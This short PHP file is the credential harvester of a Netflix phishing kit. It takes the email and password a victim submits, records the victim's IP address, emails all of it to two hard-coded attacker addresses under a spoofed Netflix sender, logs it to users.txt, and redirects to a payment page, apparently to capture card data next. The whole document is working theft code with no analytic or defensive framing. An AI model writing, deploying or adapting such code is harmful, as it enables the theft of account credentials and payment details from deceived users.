<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Netflix Info-----------------------\n";
$message .= "Username             : ".$_POST['email']."\n";
$message .= "Password            : ".$_POST['password']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY WALEX007-------------\n";
$send = "debedebe@protonmail.com,thomas.potts50@hotmail.com";
$subject = "Result from Netflix";
$headers = "From: Netflix<customer-support@Spammers>";
$headers .= $_POST['debedebe@protonmail.com,thomas.potts50@hotmail.com']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("users.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: payment.php?ip=$ip");

	 
?>